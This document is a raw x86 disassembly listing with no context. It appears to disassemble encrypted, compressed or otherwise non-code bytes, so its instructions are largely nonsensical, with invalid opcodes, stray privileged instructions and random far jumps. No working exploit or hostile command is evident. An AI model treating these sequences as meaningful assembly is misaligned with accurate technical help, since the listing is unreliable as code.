  403104:	mov    dl,BYTE PTR [edi+0x78fcf5e6]
  40310a:	es jns 0x4030f8
  40310d:	je     0x40311d
  40310f:	mov    edx,0x524b7b1a
  403114:	leave  
  403115:	loope  0x4030a2
  403117:	mov    edx,0x7a60e1de
  40311c:	fsubr  DWORD PTR [edx]
  40311f:	lahf   
  403120:	je     0x403130
  403122:	test   BYTE PTR [ebp-0x48],cl
  403125:	mov    esp,0x288a3d85
  40312a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312b:	out    0xc,eax
  40312d:	mov    al,BYTE PTR ds:0xf91b6d6c
  403133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403134:	jg     0x403105
  403136:	iret   
  403137:	fistp  WORD PTR [ecx]
  403139:	div    BYTE PTR [eax-0x3cb82e0d]
  40313f:	lds    ebp,FWORD PTR [esi]
  403141:	imul   eax,DWORD PTR [ebx],0x67838ec8
  403147:	int3   
  403148:	outs   dx,DWORD PTR ds:[esi]
  403149:	inc    edx
  40314a:	pop    ecx
  40314b:	pop    eax
  40314c:	ficom  DWORD PTR [ecx]
  40314e:	xor    ebp,ebp
  403150:	inc    ecx
  403151:	ficomp WORD PTR [esi-0x61205a40]
  403157:	xchg   ebp,eax
  403158:	cmp    esi,DWORD PTR [ecx]
  40315a:	stos   BYTE PTR es:[edi],al
  40315b:	inc    esp
  40315c:	cmp    al,0xd1
  40315e:	or     ah,dl
  403160:	xor    eax,0x5b13c539
  403165:	icebp  
  403166:	xor    bh,0xa9
  403169:	jl     0x40313a
  40316b:	(bad)  
  40316c:	jle    0x4031b0
  40316e:	shl    BYTE PTR [edx],1
  403170:	shr    esi,cl
  403172:	bound  edx,QWORD PTR [ecx+eiz*1]
  403175:	mov    edx,0x5c09112
  40317a:	xor    DWORD PTR [edx+0x2],esp
  40317d:	(bad)  
  40317e:	pop    esp
  40317f:	aam    0x7b
  403181:	xor    DWORD PTR [ebp-0x25],edi
  403184:	xchg   ebx,eax
  403185:	adc    DWORD PTR [eax],eax
  403187:	xlat   BYTE PTR ds:[ebx]
  403188:	add    DWORD PTR [edx-0x72],ecx
  40318b:	mov    ds:0xf45e64c6,al
  403190:	fild   DWORD PTR [esi+0x63]
  403193:	lock xor ecx,edx
  403196:	ins    BYTE PTR es:[edi],dx
  403197:	(bad)  
  403198:	mov    ecx,0xd02c971d
  40319d:	mov    ds:0x81310afd,eax
  4031a2:	xor    ebp,DWORD PTR [edi]
  4031a4:	mov    BYTE PTR ds:0x30348e70,dh
  4031aa:	in     eax,dx
  4031ab:	xor    al,0x40
  4031ad:	imul   BYTE PTR [esi]
  4031af:	sbb    al,0xae
  4031b1:	retf   
  4031b2:	ret    0x1ff1
  4031b5:	mov    bh,0xf1
  4031b7:	cdq    
  4031b8:	mov    edx,0x4e1e57fb
  4031bd:	ret    
  4031be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031bf:	inc    ebp
  4031c0:	idiv   BYTE PTR [ebp+0xfc20dfb]
  4031c6:	call   0xe0a8fb01
  4031cb:	inc    esi
  4031cc:	mov    ebp,DWORD PTR [ebx-0x55]
  4031cf:	aaa    
  4031d0:	push   ecx
  4031d1:	lods   al,BYTE PTR ds:[esi]
  4031d2:	leave  
  4031d3:	lods   eax,DWORD PTR ds:[esi]
  4031d4:	inc    esi
  4031d5:	push   eax
  4031d6:	cld    
  4031d7:	out    dx,eax
  4031d8:	sub    al,BYTE PTR [edx]
  4031da:	xor    DWORD PTR [ebp+0x67a1ab4],0xff36823c
  4031e4:	adc    eax,0x12943415
  4031e9:	rol    DWORD PTR [ebx+0x478c6bf8],cl
  4031ef:	dec    ecx
  4031f0:	jae    0x40325e
  4031f2:	mov    ds:0xbb3082fd,eax
  4031f7:	(bad)  
  4031f8:	jae    0x4031bf
  4031fa:	call   0x4425:0xa1d8c83d
  403201:	(bad)  
  403203:	pop    esi
  403204:	sub    esp,DWORD PTR [eax]
  403206:	stos   BYTE PTR es:[edi],al
  403207:	dec    ebp
  403208:	xor    edx,DWORD PTR [edi+0x52]
  40320b:	ror    edx,0x87
  40320e:	pop    ecx
  40320f:	or     BYTE PTR [edi+0x1555020],ah
  403215:	pusha  
  403216:	mov    al,ds:0xa7df9834
  40321b:	mov    al,0xfb
  40321d:	add    eax,0xd33ff5d0
  403222:	adc    BYTE PTR [ecx-0x3b94e157],cl
  403228:	test   BYTE PTR [edi-0x59205d6],cl
  40322e:	loope  0x4031ec
  403230:	loop   0x403274
  403232:	loopne 0x403281
  403234:	xchg   esi,eax
  403235:	daa    
  403236:	add    dl,bl
  403238:	inc    edx
  403239:	sti    
  40323a:	aam    0xc
  40323c:	lds    esi,FWORD PTR [edi]
  40323e:	mov    ah,0xfe
  403240:	push   esi
  403241:	outs   dx,DWORD PTR ds:[esi]
  403242:	mov    edx,0x878da3ae
  403247:	cmp    al,0xb6
  403249:	mov    ch,0xb0
  40324b:	push   ebx
  40324c:	aaa    
  40324d:	sub    edx,DWORD PTR [edi+0x351f5fc9]
  403253:	xor    edx,esi
  403255:	jo     0x40320d
  403257:	cmp    eax,0x6f31074f
  40325c:	and    cl,bh
  40325e:	cs in  ax,dx
  403261:	and    al,bh
  403263:	loop   0x403205
  403265:	push   eax
  403266:	shr    BYTE PTR [ecx],cl
  403268:	mov    dl,0x4e
  40326a:	xchg   esp,eax
  40326b:	daa    
  40326c:	out    dx,eax
  40326d:	mov    esp,0xd3452d6
  403272:	das    
  403273:	repnz mov dh,0xb5
  403276:	cmp    BYTE PTR cs:[eax-0x52],ah
  40327a:	jecxz  0x403293
  40327c:	retf   0x4a45
  40327f:	pop    esi
  403280:	push   ebx
  403281:	test   ebx,esp
  403283:	hlt    
  403284:	loope  0x4032e8
  403286:	inc    esp
  403287:	jecxz  0x403210
  403289:	mov    ch,0x7f
  40328b:	mov    ds:0xef183890,eax
  403290:	enter  0x90a3,0xd3
  403294:	sbb    eax,0x78af8792
  403299:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40329b:	mov    bl,bh
  40329d:	repnz xor edi,DWORD PTR [edi+0x6a]
  4032a1:	stc    
  4032a2:	mov    eax,0x472d97ad
  4032a7:	jno    0x403325
  4032a9:	mov    bl,0xba
  4032ab:	xor    BYTE PTR [eax+ecx*1-0x34955315],dl
  4032b2:	adc    esi,ecx
  4032b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b5:	(bad)  
  4032b6:	call   0xeecd:0x75463ae8
  4032bd:	inc    eax
  4032be:	imul   edi,DWORD PTR [edi],0xffffffca
  4032c1:	and    ecx,DWORD PTR [ebx+ecx*8+0x53ae4967]
  4032c8:	push   eax
  4032c9:	sub    dx,WORD PTR [edx-0x24]
  4032cd:	inc    ebx
  4032ce:	push   ecx
  4032cf:	in     al,dx
  4032d0:	ins    DWORD PTR es:[edi],dx
  4032d1:	fucomip st,st(4)
  4032d3:	mov    ah,0xe3
  4032d5:	push   ebx
  4032d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032d7:	or     BYTE PTR [ecx-0x46],0x79
  4032db:	test   BYTE PTR [edx],0x15
  4032de:	lahf   
  4032df:	jmp    0xb73d:0xee24af49
  4032e6:	mov    eax,ds:0x797c8255
  4032eb:	add    al,0x17
  4032ed:	fwait
  4032ee:	mov    cs,WORD PTR [eax]
  4032f0:	out    0xb,eax
  4032f2:	out    0x63,al
  4032f4:	ret    
  4032f5:	sbb    eax,0xe11d8d46
  4032fa:	mov    BYTE PTR [edi-0x5633737],dh
  403300:	mov    ch,0xef
  403302:	retf   0x9d16
  403305:	nop
  403306:	sub    cl,BYTE PTR [esi]
  403308:	imul   eax,DWORD PTR [edi-0x7b91db53],0x1b36cae4
  403312:	pop    esi
  403313:	jns    0x403328
  403315:	dec    esp
  403316:	mov    ebp,0x161e99f1
  40331b:	nop
  40331c:	je     0x4032ad
  40331e:	lea    edx,[edi]
  403320:	sbb    BYTE PTR [eax-0x427137],ch
  403326:	mov    ebx,0xa2a2beed
  40332b:	cdq    
  40332c:	popa   
  40332d:	pop    ds
  40332e:	jl     0x403351
  403330:	jmp    0x4032bd
  403332:	add    BYTE PTR [ebp-0x3f70a051],0xe1
  403339:	or     DWORD PTR [edi+0x2f0da7ff],ecx
  40333f:	lods   eax,DWORD PTR ds:[esi]
  403340:	jmp    0x40330a
  403342:	pushf  
  403343:	or     BYTE PTR cs:[edi+0x7da46c23],0x2f
  40334b:	mov    ebx,0xaf453e75
  403350:	jg     0x403309
  403352:	fs call 0xfb94:0x6225b105
  40335a:	add    al,0x98
  40335c:	pop    esi
  40335d:	push   ds
  40335e:	int3   
  40335f:	ja     0x403369
  403361:	mov    ch,0xa2
  403363:	mov    esp,0xb0795ce7
  403368:	out    0x2d,eax
  40336a:	es js  0x4033b3
  40336d:	retf   0x18e4
  403370:	aam    0xf4
  403372:	mov    bl,0xea
  403374:	test   al,0xb9
  403376:	dec    edx
  403377:	bnd je 0x403398
  40337a:	stos   BYTE PTR es:[edi],al
  40337b:	xchg   edi,eax
  40337c:	add    eax,0xe7229374
  403381:	bound  edx,QWORD PTR [ecx]
  403383:	dec    ecx
  403385:	(bad)  
  403386:	fsubr  DWORD PTR [ecx]
  403388:	pop    esp
  403389:	sbb    eax,0x83359b6b
  40338e:	sub    DWORD PTR [esp+eax*1+0x45],esp
  403392:	aas    
  403393:	jecxz  0x4033ed
  403395:	sub    ch,ch
  403397:	mov    ebp,0xf467aa94
  40339c:	cmp    al,0x97
  40339e:	cs retf 
  4033a0:	cli    
  4033a1:	shr    DWORD PTR [edx],1
  4033a3:	mov    WORD PTR [eax-0x43],ds
  4033a6:	call   0xacd4:0x10f12f3c
  4033ad:	bnd jmp 0xb9b8ef8e
  4033b3:	rcr    ebx,1
  4033b5:	mov    dh,BYTE PTR [edx]
  4033b7:	dec    edi
  4033b8:	push   edi
  4033b9:	xchg   ebx,eax
  4033ba:	into   
  4033bb:	shl    DWORD PTR [esi],cl
  4033bd:	push   edx
  4033be:	push   eax
  4033bf:	(bad)  
  4033c0:	fist   DWORD PTR [ebp+esi*1+0x1d]
  4033c4:	mov    dl,0xdd
  4033c6:	fbld   TBYTE PTR [edx-0x7229cf5e]
  4033cc:	mov    ebp,0xdbe0c456
  4033d1:	jmp    0xfc79ecbd
  4033d6:	xchg   ebx,eax
  4033d7:	(bad)  
  4033d8:	mov    eax,ds:0x7c9467c2
  4033dd:	add    DWORD PTR [ebp-0x9],esp
  4033e0:	add    DWORD PTR [edx+ebx*4],edx
  4033e3:	adc    al,0x18
  4033e5:	popf   
  4033e6:	add    ebx,edi
  4033e8:	(bad)  
  4033e9:	adc    dh,BYTE PTR cs:[eax-0x24d2a8b8]
  4033f0:	hlt    
  4033f1:	fsub   QWORD PTR [ecx+eax*8-0x2c]
  4033f5:	push   eax
  4033f6:	inc    edi
  4033f7:	fbstp  TBYTE PTR [ecx+0x3b]
  4033fa:	push   edi
  4033fb:	int    0xd3
  4033fd:	xor    ebp,0xffffffd9
  403400:	or     eax,0x78cb3e11
  403405:	sbb    al,0x1d
  403407:	inc    edi
  403408:	jecxz  0x403426
  40340a:	jmp    0x40346e
  40340c:	lds    eax,FWORD PTR [edx-0x24]
  40340f:	retf   
  403410:	dec    ebx
  403411:	ret    0xf5cd
  403414:	daa    
  403415:	ficomp DWORD PTR [edi]
  403417:	cmp    ecx,DWORD PTR [esi]
  403419:	dec    edx
  40341a:	or     ah,bh
  40341c:	pop    eax
  40341d:	icebp  
  40341e:	dec    eax
  40341f:	xchg   BYTE PTR [edx+0xf],ah
  403422:	rol    DWORD PTR [ecx-0x17],cl
  403425:	(bad)  
  403426:	sbb    dh,BYTE PTR [ebp+edi*4+0x2c]
  40342a:	and    esp,DWORD PTR ds:0x18627100
  403430:	pop    eax
  403431:	fdivr  DWORD PTR [edx-0x69]
  403434:	pop    ebx
  403435:	bsr    ebx,DWORD PTR [esi+esi*1]
  403439:	loop   0x403413
  40343b:	xchg   esp,eax
  40343c:	inc    ebx
  40343d:	sbb    ch,dl
  40343f:	sbb    eax,DWORD PTR [edx-0x6813f3f1]
  403445:	in     al,0x71
  403447:	xor    dl,BYTE PTR [eax+0x23e8a1ac]
  40344d:	adc    DWORD PTR [esi+0x15],ebp
  403450:	jnp    0x40343e
  403452:	adc    esp,DWORD PTR [ebp+0x4f57f74a]
  403458:	xchg   edi,eax
  403459:	sub    DWORD PTR [ebx+0x33],esi
  40345c:	in     al,dx
  40345d:	sbb    DWORD PTR [ebx+0x17],eax
  403460:	stc    
  403461:	and    esp,esi
  403463:	pusha  
  403464:	out    0xf8,eax
  403466:	dec    edi
  403467:	add    DWORD PTR [edx],esi
  403469:	inc    esp
  40346a:	sub    ch,BYTE PTR [ebx+0x5f]
  40346d:	cmp    DWORD PTR [edi-0x41],esi
  403470:	and    eax,0x9af286a8
  403475:	cmp    ebx,DWORD PTR [ecx+0x550d6776]
  40347b:	out    dx,al
  40347c:	sub    DWORD PTR [ebp+0x2f],ebp
  40347f:	mov    eax,0x14522768
  403484:	cli    
  403485:	lods   al,BYTE PTR ds:[esi]
  403486:	pop    eax
  403487:	inc    edi
  403488:	iret   
  403489:	popf   
  40348a:	adc    al,0x6b
  40348c:	jge    0x4034b8
  40348e:	mov    WORD PTR [ecx+esi*8],?
  403491:	mov    eax,ds:0xab24a06
  403496:	out    dx,eax
  403497:	dec    esp
  403498:	test   BYTE PTR ds:0x90a77661,bh
  40349e:	into   
  40349f:	inc    ebx
  4034a0:	test   DWORD PTR [edx+0x1830b1f9],ecx
  4034a6:	jl     0x403464
  4034a8:	in     al,0xf2
  4034aa:	les    edi,FWORD PTR [ecx+edx*2]
  4034ad:	in     eax,dx
  4034ae:	mov    DWORD PTR [eax+0x7d],esi
  4034b1:	mov    ch,0xf0
  4034b3:	inc    ecx
  4034b4:	mov    DWORD PTR [ecx],ecx
  4034b6:	mov    bh,0xe1
  4034b8:	fbstp  TBYTE PTR [edi]
  4034ba:	mov    edx,0x61d86837
  4034bf:	mov    DWORD PTR [edi+0xb],ebx
  4034c2:	jno    0x4034a5
  4034c4:	das    
  4034c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c6:	out    0x11,al
  4034c8:	add    bh,BYTE PTR [edx+0x878be9e]
  4034ce:	fdivr  DWORD PTR [eax-0x45bda14c]
  4034d4:	lds    eax,FWORD PTR [ecx-0x2]
  4034d7:	pop    ebx
  4034d8:	mov    dh,0x56
  4034da:	jp     0x403464
  4034dc:	xor    DWORD PTR [edx+0x68],esi
  4034df:	sub    al,0x68
  4034e1:	imul   DWORD PTR [edx]
  4034e3:	and    DWORD PTR [edx+eax*8+0x47],edx
  4034e7:	ja     0x40346b
  4034e9:	pop    edi
  4034ea:	in     eax,0xbd
  4034ec:	int3   
  4034ed:	sub    BYTE PTR [edx-0x37fa7109],cl
  4034f3:	cld    
  4034f4:	aam    0x5
  4034f6:	test   BYTE PTR [esi-0x13],ch
  4034f9:	(bad)  
  4034fa:	mov    cl,0x86
  4034fc:	ror    ebp,0xf7
  4034ff:	es dec eax
  403501:	xor    cl,BYTE PTR [edx+eax*8-0x3b]
  403505:	scas   eax,DWORD PTR es:[edi]
  403506:	pop    es
  403507:	ja     0x4034cb
  403509:	and    esi,ebp
  40350b:	jb     0x40354b
  40350d:	aaa    
  40350e:	adc    BYTE PTR [ecx+0x4a],dl
  403511:	cmp    al,0xce
  403513:	ja     0x403550
  403515:	mov    DWORD PTR [ebp*8-0x4caab2de],esi
  40351c:	and    ebp,DWORD PTR [edx-0x76c3d4cf]
  403522:	sbb    BYTE PTR [ebx-0xb],dh
  403525:	adc    bl,BYTE PTR [eax]
  403527:	and    ebp,esi
  403529:	and    eax,0xda6a6e10
  40352e:	push   ebx
  40352f:	ins    BYTE PTR es:[edi],dx
  403530:	xor    al,0x5
  403532:	adc    al,BYTE PTR [edx]
  403534:	arpl   WORD PTR [edi+0x59fc7c7e],bp
  40353a:	outs   dx,DWORD PTR es:[esi]
  40353c:	stos   DWORD PTR es:[edi],eax
  40353d:	retf   0x2d60
  403540:	mov    DWORD PTR [ecx+0x4b],eax
  403543:	aad    0x4d
  403545:	popa   
  403546:	xor    esp,eax
  403548:	jle    0x403586
  40354a:	xor    bl,BYTE PTR [edx+0x4f9a8622]
  403550:	clc    
  403551:	fwait
  403552:	cld    
  403553:	mov    ebx,0x1cb0ecf2
  403558:	cwde   
  403559:	pop    eax
  40355a:	inc    ebx
  40355b:	mov    edi,0xc47e80e9
  403560:	stos   BYTE PTR es:[edi],al
  403561:	test   eax,0xfc2d6f5b
  403566:	jl     0x5cd21d53
  40356c:	xchg   edi,eax
  40356d:	and    edx,DWORD PTR [ebx+0x7f]
  403570:	imul   esi,DWORD PTR [eax],0x78cd3754
  403576:	cmp    DWORD PTR [edi-0x530b70e7],0x1c81a841
  403580:	in     al,dx
  403581:	sbb    bl,BYTE PTR [eax-0x679964e4]
  403587:	mov    al,0xda
  403589:	mov    ebp,0x585accbe
  40358e:	or     edi,DWORD PTR es:0xfc0f173d
  403595:	xchg   esi,eax
  403596:	mov    ds:0x41171393,al
  40359b:	fisttp QWORD PTR [ebp-0x12]
  40359e:	aaa    
  40359f:	or     eax,0xca8f82fc
  4035a4:	pop    ecx
  4035a5:	call   0x4360:0x36fab7b
  4035ac:	icebp  
  4035ad:	or     al,0x3c
  4035af:	pop    esp
  4035b0:	lods   al,BYTE PTR ds:[esi]
  4035b1:	push   esi
  4035b2:	and    al,0xc5
  4035b4:	and    dh,BYTE PTR [ecx+0x5d9e6500]
  4035ba:	stos   DWORD PTR es:[edi],eax
  4035bb:	(bad)  
  4035bc:	push   esp
  4035bd:	pop    edi
  4035be:	iret   
  4035bf:	xor    BYTE PTR [ecx-0x7f],dh
  4035c2:	inc    ebx
  4035c3:	in     eax,0xc6
  4035c5:	mov    es,eax
  4035c7:	mov    ebp,0x3708d58e
  4035cc:	ret    
  4035cd:	leave  
  4035ce:	push   edx
  4035cf:	inc    ebp
  4035d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d1:	sub    bh,dl
  4035d3:	psrlw  mm5,mm3
  4035d6:	adc    al,0xa2
  4035d8:	fdivrp st(5),st
  4035da:	ficomp DWORD PTR [ebx+eiz*4-0x22]
  4035de:	sbb    edi,DWORD PTR [edi]
  4035e0:	jmp    FWORD PTR [edx+ebp*1]
  4035e3:	inc    eax
  4035e4:	aaa    
  4035e5:	ret    
  4035e6:	(bad)  
  4035e7:	pop    edx
  4035e8:	data16 fdivr QWORD PTR [ebx+eiz*2+0x3f9aed92]
  4035f0:	jne    0x4035b8
  4035f2:	fld    QWORD PTR [ebx]
  4035f4:	xchg   esp,eax
  4035f5:	fldcw  WORD PTR [edi-0x2ef70b56]
  4035fb:	jmp    0xad4c:0xf6857f0e
  403602:	jns    0x403626
  403604:	lahf   
  403605:	and    bl,dl
  403607:	clc    
  403608:	test   DWORD PTR [edx+edx*2+0x66],eax
  40360c:	push   esp
  40360d:	enter  0xbff9,0x56
  403611:	xchg   edx,eax
  403612:	dec    esi
  403613:	pop    edi
  403614:	ret    0x7d0d
  403617:	cmp    ebx,eax
  403619:	dec    edx
  40361a:	sbb    eax,0x83d19ce9
  40361f:	push   cs
  403620:	mov    cl,0xa3
  403622:	stc    
  403623:	je     0x4035c6
  403625:	or     eax,0x9a6c3a29
  40362a:	dec    esp
  40362b:	nop
  40362c:	mov    ?,WORD PTR cs:[esi-0x42]
  403630:	cmp    ch,bh
  403632:	enter  0xa4cd,0xba
  403636:	sub    ax,0x33d3
  40363a:	or     BYTE PTR [ebx+0x4ae23cd],bh
  403640:	sub    al,0x95
  403642:	cmp    eax,esi
  403644:	in     al,dx
  403645:	mov    dl,al
  403647:	sbb    bh,BYTE PTR [edx+0xdcf2cfd]
  40364d:	leave  
  40364e:	int    0x7a
  403650:	push   edx
  403651:	push   ecx
  403652:	fist   DWORD PTR [edi+0x62]
  403655:	inc    edx
  403656:	pop    edi
  403657:	push   ebx
  403658:	scas   al,BYTE PTR es:[edi]
  403659:	xchg   ebp,eax
  40365a:	push   edi
  40365b:	call   0x2c36:0xc22593b5
  403662:	scas   al,BYTE PTR es:[edi]
  403663:	xchg   ebp,esp
  403665:	and    eax,0x9d380eb2
  40366a:	inc    ebx
  40366b:	repz (bad) 
  40366d:	mov    dh,0x7
  40366f:	bound  esi,QWORD PTR ds:0x672324b7
  403675:	out    0xc,eax
  403677:	out    dx,al
  403678:	sub    DWORD PTR [esi],ebx
  40367a:	cmp    eax,0x345dcbb0
  40367f:	jmp    0x74c:0xd8c1f01d
  403686:	inc    ebp
  403687:	jnp    0x4036fc
  403689:	imul   ebx,DWORD PTR [edi-0x2d],0x6417e4ad
  403690:	mov    al,BYTE PTR [ebx+0x255c83a6]
  403696:	nop
  403697:	push   ss
  403698:	cmp    DWORD PTR [edx],ecx
  40369a:	push   esp
  40369b:	push   ebx
  40369c:	jmp    0xee82:0x2b21c152
  4036a3:	dec    edx
  4036a4:	mov    al,0xb6
  4036a6:	lock shl BYTE PTR ds:0x54d9b942,cl
  4036ad:	jle    0x4036db
  4036af:	sbb    bh,BYTE PTR [ebx]
  4036b1:	test   BYTE PTR ds:0x79553bc3,al
  4036b7:	push   es
  4036b8:	cld    
  4036b9:	xor    DWORD PTR [ebp+0x29],edi
  4036bc:	sbb    edi,DWORD PTR [edi+0x4f0abfea]
  4036c2:	aad    0x57
  4036c4:	fst    QWORD PTR [eax]
  4036c6:	out    0x6a,eax
  4036c8:	rcr    BYTE PTR [ecx-0xe],0xd7
  4036cc:	adc    BYTE PTR [eax+0x50],0xe6
  4036d0:	or     esp,DWORD PTR [edx]
  4036d2:	jmp    0x8a9d:0x79539c78
  4036d9:	pop    esp
  4036da:	xor    esi,DWORD PTR [edx-0x5079aae1]
  4036e0:	(bad)  [edi]
  4036e2:	std    
  4036e3:	cdq    
  4036e4:	cs cmc 
  4036e6:	and    BYTE PTR [edx+0x7c],ch
  4036e9:	bound  esp,QWORD PTR [ebp-0xeb808c2]
  4036ef:	leave  
  4036f0:	int    0x9
  4036f2:	jg     0x40368c
  4036f4:	dec    di
  4036f6:	push   ebp
  4036f7:	(bad)
  4036fb:	push   ebp
  4036fc:	ss jb  0x4036f9
  4036ff:	xchg   edi,eax
  403700:	add    esp,DWORD PTR [esi-0x6d]
  403703:	cmp    al,0x84
  403705:	push   esi
  403706:	or     ebx,DWORD PTR [eax+0x320d417e]
  40370c:	cmp    ch,BYTE PTR [esi+0x20]
  40370f:	call   0x8bfd:0x224d020a
  403716:	inc    esi
  403717:	inc    edi
  403718:	stc    
  403719:	sub    al,0x44
  40371b:	push   0x389ba930
  403720:	add    al,0x58
  403722:	jno    0x4036ac
  403724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403725:	scas   al,BYTE PTR es:[edi]
  403726:	pop    ebx
  403727:	sbb    eax,0x4aa88a56
  40372c:	dec    edx
  40372d:	mov    ?,WORD PTR [ecx]
  40372f:	pop    ds
  403730:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  403732:	mov    bh,0x3b
  403734:	dec    esi
  403735:	fbld   TBYTE PTR [ebp-0x63]
  403738:	retf   0x2c9d
  40373b:	sbb    DWORD PTR [ebp+0x50],ecx
  40373e:	and    al,0x60
  403740:	mov    bh,0x5
  403742:	fwait
  403743:	cmp    al,BYTE PTR [ebx+0x66]
  403746:	mov    BYTE PTR [esi-0xb],al
  403749:	scas   al,BYTE PTR es:[edi]
  40374a:	inc    ecx
  40374b:	stos   DWORD PTR es:[edi],eax
  40374c:	and    DWORD PTR [ecx+0x5c],0x40
  403750:	pop    ebx
  403751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403752:	push   eax
  403753:	das    
  403754:	dec    ecx
  403755:	inc    esi
  403756:	xchg   edx,eax
  403757:	mov    esi,0x6b9cc1ee
  40375c:	sub    al,0x2c
  40375e:	dec    edx
  40375f:	(bad)  
  403760:	(bad)  
  403761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403762:	adc    al,BYTE PTR ds:0x97a2b8a4
  403768:	push   ebp
  403769:	xchg   ebx,eax
  40376a:	lods   eax,DWORD PTR ds:[esi]
  40376b:	dec    ebx
  40376c:	cmp    DWORD PTR [ebx+ecx*8],0x52
  403770:	or     eax,0xcf9fd6c6
  403775:	ror    BYTE PTR [edi],0x12
  403778:	aad    0x7a
  40377a:	push   ebx
  40377b:	cmp    DWORD PTR [ecx-0x283e98],ebp
  403781:	cld    
  403782:	nop
  403783:	push   esp
  403784:	mov    esi,0x8a50f3dd
  403789:	mov    BYTE PTR [edi+0x36e5480f],0x69
  403790:	adc    DWORD PTR [ecx-0x416cde85],ebp
  403796:	mov    ecx,0xd4681128
  40379b:	sbb    al,0x8c
  40379d:	push   0x7fe74bcc
  4037a2:	not    DWORD PTR [esi-0x2a]
  4037a5:	jmp    0x357f:0xd1bbe195
  4037ac:	repz dec edx
  4037ae:	xor    eax,0x9a002bae
  4037b3:	and    esi,DWORD PTR [edi]
  4037b5:	or     ch,BYTE PTR [eax-0x17]
  4037b8:	cmc    
  4037b9:	or     eax,DWORD PTR [esi+0x2f]
  4037bc:	in     al,0x1
  4037be:	in     eax,0xc0
  4037c0:	xchg   edx,eax
  4037c1:	jne    0x4037b2
  4037c3:	jmp    0xdf661e83
  4037c8:	inc    edi
  4037c9:	call   0x560a71ee
  4037ce:	and    al,0xd7
  4037d0:	and    DWORD PTR fs:[esi+0x64],esi
  4037d4:	jmp    0x4037e5
  4037d6:	add    WORD PTR [edx+0x1b],dx
  4037da:	or     DWORD PTR [esi-0x1],0xffffffc7
  4037de:	push   es
  4037df:	pop    ebx
  4037e0:	(bad)  
  4037e1:	mov    ecx,?
  4037e3:	push   0xffffffdd
  4037e5:	out    0x53,eax
  4037e7:	mov    eax,0x7d9487c0
  4037ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ed:	(bad)  
  4037ee:	jns    0x403868
  4037f0:	push   edx
  4037f1:	cmc    
  4037f2:	js     0x40385d
  4037f4:	pop    edx
  4037f5:	fwait
  4037f6:	dec    ebp
  4037f7:	leave  
  4037f8:	test   esp,ecx
  4037fa:	dec    edx
  4037fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037fc:	data16 into 
  4037fe:	xchg   edi,eax
  4037ff:	cld    
  403800:	adc    BYTE PTR [edx+0x60],ah
  403803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403804:	out    dx,eax
  403805:	repnz lea ebp,[esi+0x212931b4]
  40380c:	pushf  
  40380d:	mov    esi,0xc2301cd0
  403812:	outs   dx,DWORD PTR ds:[esi]
  403813:	in     al,dx
  403814:	(bad)  
  403815:	in     eax,0xf7
  403817:	dec    edx
  403818:	ss aaa 
  40381a:	push   ebx
  40381b:	(bad)
  40381f:	add    eax,0xdd581fad
  403824:	popf   
  403825:	test   ebp,esp
  403827:	xor    ecx,esp
  403829:	aad    0x5c
  40382b:	nop
  40382c:	jg     0x4037ce
  40382e:	jp     0x4037d5
  403830:	xor    edi,eax
  403832:	scas   al,BYTE PTR es:[edi]
  403833:	inc    ebp
  403834:	repz sub DWORD PTR [ebx+0x667d498e],ecx
  40383b:	mov    esi,0xe99fc5fd
  403840:	ss pusha 
  403842:	imul   eax,esp,0x5eb4e9f
  403848:	rol    BYTE PTR [ecx],0x26
  40384b:	repz int3 
  40384d:	mov    esi,?
  40384f:	sub    BYTE PTR ds:0xd0f7e303,0x14
  403856:	repz je 0x403850
  403859:	fbstp  TBYTE PTR [edi-0x44]
  40385c:	bound  ebp,QWORD PTR [edi-0x21b0780e]
  403862:	aad    0x18
  403864:	loop   0x403867
  403866:	stos   BYTE PTR es:[edi],al
  403867:	out    0x83,al
  403869:	pop    edi
  40386a:	lods   eax,DWORD PTR ds:[esi]
  40386b:	jle    0x4037fb
  40386d:	add    al,BYTE PTR [eax+eiz*4+0x52]
  403871:	imul   ebx,DWORD PTR [esi-0x225d1a7f],0x932a7ec1
  40387b:	pushf  
  40387c:	or     al,0xed
  40387e:	and    eax,0x500c9de7
  403883:	in     eax,0xfd
  403885:	mov    bl,0xe5
  403887:	dec    edi
  403888:	or     al,0xc0
  40388a:	jg     0x4038fc
  40388c:	cmp    al,0x56
  40388e:	adc    dh,al
  403890:	popfw  
  403892:	cmc    
  403893:	xchg   esp,eax
  403894:	(bad)  [ebx-0x7e0c91bb]
  40389a:	test   eax,0xb7aec267
  40389f:	ss push ebx
  4038a1:	add    ebp,edi
  4038a3:	rol    BYTE PTR [di],0x91
  4038a7:	mov    eax,ds:0xef72f2d8
  4038ac:	pop    ebx
  4038ad:	xchg   ebx,eax
  4038ae:	jcxz   0x4038a2
  4038b1:	rcr    eax,0x49
  4038b4:	jae    0x403886
  4038b6:	cmp    DWORD PTR [edi],ecx
  4038b8:	and    al,0x63
  4038ba:	stos   BYTE PTR es:[edi],al
  4038bb:	aas    
  4038bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038bd:	mov    ch,0x1d
  4038bf:	mov    es,esi
  4038c1:	sub    DWORD PTR [ecx+0x5361bf05],edx
  4038c7:	test   DWORD PTR ds:0xcf6474e4,esi
  4038cd:	xor    eax,DWORD PTR [esi]
  4038cf:	xchg   edi,eax
  4038d0:	nop
  4038d1:	push   edx
  4038d2:	(bad)  
  4038d3:	fild   QWORD PTR [edx+0x57]
  4038d6:	mov    esp,DWORD PTR [ecx-0x64]
  4038d9:	add    al,0xf5
  4038db:	fdivr  st(7),st
  4038dd:	dec    edx
  4038de:	into   
  4038df:	dec    esp
  4038e0:	xor    eax,0x3f8abd85
